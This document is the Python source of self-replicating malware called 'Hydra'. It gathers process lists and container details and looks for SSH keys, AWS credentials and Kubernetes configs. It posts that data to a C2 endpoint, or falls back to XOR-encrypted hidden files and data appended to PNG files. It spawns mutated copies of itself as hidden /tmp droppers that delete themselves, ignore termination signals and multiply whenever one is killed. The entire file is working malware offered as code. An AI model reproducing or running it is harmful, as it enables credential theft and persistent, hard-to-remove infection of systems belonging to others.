import os
import sys
import time
import random
import subprocess
import signal
import inspect
import json
import urllib.request
import platform
import glob

# CONFIG
VIRAL_LOAD = 3  # Initial number of agents
REPLICATION_FACTOR = 2 # How many spawn if one dies
HEARTBEAT_FILE = "/tmp/.flu_heartbeat.json"
RECON_LOG = "/tmp/.flu_symptoms.log"
POISON_DIR = "/tmp/hydra_toxin"
LOOT_DIR = "/tmp/.hydra_loot"
C2_URL = "http://localhost:10000/exfil"

# --- HYPER RECON ---

class DeepScout:
    """
    2026-Era Reconnaissance Suite.
    Focus: Cloud, Containers, Process Tracing, Credential Hunting.
    """

    @staticmethod
    def get_process_list():
        procs = []
        try:
            for pid in os.listdir('/proc'):
                if pid.isdigit():
                    try:
                        with open(f'/proc/{pid}/cmdline', 'rb') as f:
                            cmd = f.read().replace(b'\0', b' ').decode('utf-8', 'ignore').strip()
                            if cmd:
                                procs.append({'pid': pid, 'cmd': cmd})
                    except: pass
        except: pass
        return procs[:10]

    @staticmethod
    def check_cloud_container():
        env = {}
        try:
            if os.path.exists('/.dockerenv'): env['container'] = 'docker'
            if os.path.exists('/var/run/secrets/kubernetes.io/serviceaccount'): env['orch'] = 'kubernetes'
            with open('/proc/1/cgroup', 'r') as f:
                if 'docker' in f.read(): env['cgroup'] = 'docker'
        except: pass
        return env

    @staticmethod
    def hunt_creds():
        loot = []
        home = os.path.expanduser("~")
        targets = [".ssh/id_rsa", ".aws/credentials", ".kube/config"]
        for t in targets:
            path = os.path.join(home, t)
            if os.path.exists(path):
                loot.append({'path': path, 'found': True})
        return loot

    @staticmethod
    def exfil(data):
        """Live Exfiltration with Robust Fallback."""
        payload = json.dumps(data).encode('utf-8')
        success = False

        # Method 1: HTTP Post to C2
        try:
            req = urllib.request.Request(C2_URL, data=payload, method="POST")
            req.add_header('Content-Type', 'application/json')
            req.add_header('X-Agent-Gen', 'Hydra-2026')
            with urllib.request.urlopen(req, timeout=1) as r:
                success = True
        except:
            pass

        if not success:
            DeepScout.fallback_exfil(data)

    @staticmethod
    def fallback_exfil(data):
        """
        Fallback: Drop encrypted loot to hidden directory or steganography.
        """
        try:
            # 1. Ensure Loot Dir
            if not os.path.exists(LOOT_DIR):
                os.makedirs(LOOT_DIR, mode=0o700)

            # 2. Encrypt (Simple XOR for independence)
            key = int(time.time())
            encoded = json.dumps(data).encode('utf-8')
            encrypted = bytearray([b ^ (key % 255) for b in encoded])

            # 3. Write to Loot Bag
            fname = f"{LOOT_DIR}/loot_{int(time.time())}_{random.randint(1000,9999)}.dat"
            with open(fname, "wb") as f:
                f.write(encrypted)

            # 4. Steganography Injection (Opportunistic)
            # Find any .png in /tmp and append data
            pngs = glob.glob("/tmp/*.png")
            if pngs:
                target_png = random.choice(pngs)
                with open(target_png, "ab") as f:
                    f.write(b"__HYDRA__" + encrypted)

            # Log success locally
            with open(RECON_LOG, "a") as f:
                f.write(f"LOOT_SECURED: {fname}\n")

        except Exception as e:
            with open(RECON_LOG, "a") as f:
                f.write(f"EXFIL_TOTAL_FAIL: {str(e)}\n")

# --- GENETICS ENGINE ---

def mutate_source(source_code, gene_seed):
    random.seed(gene_seed)
    lines = source_code.split('\n')
    new_lines = []
    junk_vars = [f"_gene_{random.randint(1000,9999)}" for _ in range(5)]
    for line in lines:
        new_lines.append(line)
        if line.strip().startswith("def ") or line.strip().startswith("import "):
            if random.random() < 0.3:
                junk = f"    {random.choice(junk_vars)} = {random.randint(0, 1000)} # GENE: {gene_seed}"
                new_lines.append(junk)
    return '\n'.join(new_lines)

def validate_gene(source_code):
    try:
        compile(source_code, '<string>', 'exec')
        return True
    except SyntaxError:
        return False

# --- VIRAL LOGIC ---

def viral_agent_logic(agent_id, gene_generation=0):
    try:
        if hasattr(os, 'setsid'): os.setsid()
    except: pass

    try:
        if __file__.startswith("/tmp/.hydra_"): os.remove(__file__)
    except: pass

    def on_kill(signum, frame):
        try:
            with open(POISON_DIR + f"_{agent_id}", "w") as f:
                f.write(f"TOXIN_RELEASED_GEN_{gene_generation}")
        except: pass
        sys.exit(0)
    signal.signal(signal.SIGTERM, on_kill)

    scout = DeepScout()

    while True:
        try:
            task = random.choice(['proc', 'cloud', 'creds', 'net'])
            data = {'agent': agent_id, 'gen': gene_generation, 'type': task, 'ts': time.time()}

            if task == 'proc': data['payload'] = scout.get_process_list()
            elif task == 'cloud': data['payload'] = scout.check_cloud_container()
            elif task == 'creds': data['payload'] = scout.hunt_creds()
            elif task == 'net': data['payload'] = "Connected"

            # 2. Exfil
            if random.random() < 0.2:
                scout.exfil(data)

            time.sleep(random.uniform(2, 5))
        except: pass

def spawn_agent(agent_id, generation):
    try:
        with open(__file__, 'r') as f: source = f.read()
    except:
        import payloads.hydra
        source = inspect.getsource(payloads.hydra)

    gene_seed = random.randint(0, 100000)
    mutated_source = mutate_source(source, gene_seed)
    if not validate_gene(mutated_source): mutated_source = source

    child_entry = f"\nif __name__ == '__main__':\n    viral_agent_logic({agent_id}, {generation})"
    marker = 'if __name__ == "__main__":'
    if marker in mutated_source:
        parts = mutated_source.rsplit(marker, 1)
        final_code = parts[0] + child_entry
    else:
        final_code = mutated_source + child_entry

    dropper_path = f"/tmp/.hydra_{random.randint(10000,99999)}.py"
    with open(dropper_path, "w") as f: f.write(final_code)

    cmd = [sys.executable, dropper_path]
    return subprocess.Popen(cmd, start_new_session=True)

def patient_zero():
    procs = []
    generation = 1
    print(f"[FLU] Patient Zero {os.getpid()} infecting host...")
    for i in range(VIRAL_LOAD):
        procs.append(spawn_agent(random.randint(1000,9999), generation))

    while True:
        new_procs = []
        for p in procs:
            if p.poll() is None: new_procs.append(p)
            else:
                print(f"[FLU] Agent {p.pid} died! Breeding Generation {generation+1}...")
                for _ in range(REPLICATION_FACTOR):
                    procs.append(spawn_agent(random.randint(1000,9999), generation + 1))
        procs = [p for p in procs if p.poll() is None]
        if not procs:
             for i in range(VIRAL_LOAD):
                procs.append(spawn_agent(random.randint(1000,9999), generation))
        time.sleep(2)

if __name__ == "__main__":
    patient_zero()
